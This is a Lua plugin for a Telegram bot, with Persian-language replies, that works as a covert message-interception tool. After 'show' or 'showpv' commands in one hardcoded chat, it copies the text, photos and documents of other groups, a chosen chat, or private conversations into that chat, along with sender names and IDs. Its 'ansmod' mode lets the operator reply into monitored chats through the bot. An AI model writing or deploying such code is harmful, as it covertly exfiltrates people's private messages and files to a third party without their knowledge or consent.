local function doc(msg, success, result)
    if success then
            print('File downloaded to:', result)
            send_document('chat#142334685', result, ok_cb, false)
    else
            print('Error downloading: '..msg.id)
            send_large_msg('chat#142334685', 'Failed to download', ok_cb, false)
    end
end

local function doc_to2(msg, success, result)
    if success then
            print('File downloaded to:', result)
            send_document('chat#'..redis:get("id"), result, ok_cb, false)
    end
end

local function doc_to4(msg, success, result)
    if success then
            print('File downloaded to:', result)
            send_document('user#'..redis:get("id"), result, ok_cb, false)
    end
end

local function ph(msg, success, result)
    if success then
            print('File downloaded to:', result)
            send_photo('chat#142334685', result, ok_cb, false)
    else
            print('Error downloading: '..msg.id)
            send_large_msg('chat#142334685', 'Failed to download', ok_cb, false)
    end
end

local function ph_to2(msg, success, result)
    if success then
            print('File downloaded to:', result)
            send_photo('chat#'..redis:get("id"), result, ok_cb, false)
    end
end

local function ph_to4(msg, success, result)
    if success then
            print('File downloaded to:', result)
            send_photo('user#'..redis:get("id"), result, ok_cb, false)
    end
end

local function run(msg, matches)
local type = mimetype.get_content_type_no_sub(matches[1])
    if matches[1] == "show" and not matches[2] or matches[1] == "Show" and not matches[2] then
            if msg.to.id == 142334685 then
              show = 1
              ansmod = 0
              return "فعال 😈"
            else
              send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
            end
    elseif matches[1] == "show" and matches[2] ~= 'nil' or matches[1] == "Show" and matches[2] ~= 'nil' then
            if msg.to.id == 142334685 then
              redis:set("id", matches[2])
              show = 2
              ansmod = 0
              return "فعال 😈"
            else
              send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
            end
    elseif matches[1] == "stop" or matches[1] == "Stop" then
          if msg.to.id == 142334685 then
            show = 0
            ansmod = 0
            redis:del("id")
            redis:del("ansmod")
            return "غیر فعال"
          else
            send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
          end
    elseif matches[1] == "showpv" and not matches[2] or matches[1] == "Showpv" and not matches[2] then
          if msg.to.id == 142334685 then
              show = 3
              ansmod = 0
              return "فعال 😈"
            else
              send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
            end
    elseif matches[1] == "showpv" and matches[2] ~= 'nil' or matches[1] == "Showpv" and matches[2] ~= 'nil' then
          if msg.to.id == 142334685 then
              redis:set("id", matches[2])
              show = 4
              ansmod = 0
              return "فعال 😈"
            else
              send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
            end
    elseif matches[1] == "ansmod" or matches[1] == "Ansmod" then
          if is_sudo(msg) then
            if tonumber(ansmod) == 0 then
              if msg.to.id == 142334685 then
                if tonumber(show) == 2 or tonumber(show) == 4 then
                  redis:set("ansmod", msg.from.id)
                  ansmod = 1
                  return "on"
                else
                  return "Error"
                end
              else
                send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
              end
            end
          end
    end
    if tonumber(show) == 1 then
      if msg.media then
          if msg.media.type == 'document' then
            send_msg('chat#142334685', msg.from.print_name..'\n'..msg.to.print_name..'\n'..msg.to.id.."\n👇👇👇👇👇", ok_cb, false)
            load_document(msg.id, doc, msg)
          elseif msg.media.type == 'photo' then
            send_msg('chat#142334685', msg.from.print_name..'\n'..msg.to.print_name..'\n'..msg.to.id.."\n👇👇👇👇👇", ok_cb, false)
            load_photo(msg.id, ph, msg)
          else
            send_msg('chat#142334685', msg.from.print_name..'\n'..msg.to.print_name..'\n'..msg.to.id..'\n___________\n'..msg.text, ok_cb, false)
          end
        else
          send_msg('chat#142334685', msg.from.print_name..'\n'..msg.to.print_name..'\n'..msg.to.id..'\n___________\n'..msg.text, ok_cb, false)
        end
      
    elseif tonumber(show) == 2 then
      if msg.to.id == tonumber(redis:get("id")) then
        if msg.media then
          if msg.media.type == 'document' then
            send_msg('chat#142334685', msg.from.print_name..'\n'..msg.to.print_name..'\n'..msg.to.id.."\n👇👇👇👇👇", ok_cb, false)
            load_document(msg.id, doc, msg)
          elseif msg.media.type == 'photo' then
            send_msg('chat#142334685', msg.from.print_name..'\n'..msg.to.print_name..'\n'..msg.to.id.."\n👇👇👇👇👇", ok_cb, false)
            load_photo(msg.id, ph, msg)
          else
            send_msg('chat#142334685', msg.from.print_name.. '\n___________\n'..msg.text, ok_cb, false)
          end
        else
          send_msg('chat#142334685', msg.from.print_name.. '\n___________\n'..msg.text, ok_cb, false)
        end
      end
    elseif tonumber(show) == 3 then
      if msg.to.type == "user" then
        if msg.media then
          if msg.media.type == 'document' then
            send_msg('chat#142334685', msg.from.print_name..'\n'..msg.from.id.."\n👇👇👇👇👇", ok_cb, false)
            load_document(msg.id, doc, msg)
          elseif msg.media.type == 'photo' then
            send_msg('chat#142334685', msg.from.print_name..'\n'..msg.from.id.."\n👇👇👇👇👇", ok_cb, false)
            load_photo(msg.id, ph, msg)
          else
            send_msg('chat#142334685', msg.from.print_name..'\n'..msg.from.id..'\n___________\n'..msg.text, ok_cb, false)
          end
        else
          send_msg('chat#142334685', msg.from.print_name..'\n'..msg.from.id..'\n___________\n'..msg.text, ok_cb, false)
        end
      end
    elseif tonumber(show) == 4 then
      if msg.to.type == "user" then
        if msg.from.id == tonumber(redis:get("id")) then
          fwd_msg('chat#142334685', msg.id, ok_cb, false)
        end
      end
    elseif tonumber(show) == 5 then
      if msg.to.type == "user" then
        send_msg('chat#114667579', msg.text, ok_cb, false)
      end
    end
    if msg.to.id == 142334685 then
      if ansmod == 1 then
        if msg.from.id == tonumber(redis:get("ansmod")) then
          if matches[1] == "ansmod off" or matches[1] == "Ansmod off" then
            redis:del("ansmod")
            ansmod = 0
            return "off"
          elseif tonumber(show) == 2 then
            if msg.media then
              if msg.media.type == 'document' then
                load_document(msg.id, doc_to2, msg)
              elseif msg.media.type == 'photo' then
                load_photo(msg.id, ph_to2, msg)
              else
                send_msg('chat#'..redis:get("id"), matches[1], ok_cb, false)
              end
            else
              send_msg('chat#'..redis:get("id"), matches[1], ok_cb, false)
            end
          elseif tonumber(show) == 4 then
            if msg.media then
              if msg.media.type == 'document' then
                load_document(msg.id, doc_to4, msg)
              elseif msg.media.type == 'photo' then
                load_photo(msg.id, ph_to4, msg)
              else
                send_msg('user#'..redis:get("id"), matches[1], ok_cb, false)
              end
            else
              send_msg('user#'..redis:get("id"), matches[1], ok_cb, false)
            end
          elseif tonumber(show) == 5 then
            send_msg('user#143641826', matches[1], ok_cb, false)
          end
        end
      end
    end
end
return {
     patterns = {
        "^([Ss]how)$",
        "^([Ss]howpv)$",
        "^([Ss]how) (%d+)$",
        "^([Ss]howpv) (%d+)$",
        "^([Ss]top)$",
        "^([Aa]nsmod)$",
        "^([Aa]nsmod off)$",
        "%[(photo)%]",
        "%[(document)%]",
        "^(.*)$"
        },
     run = run
}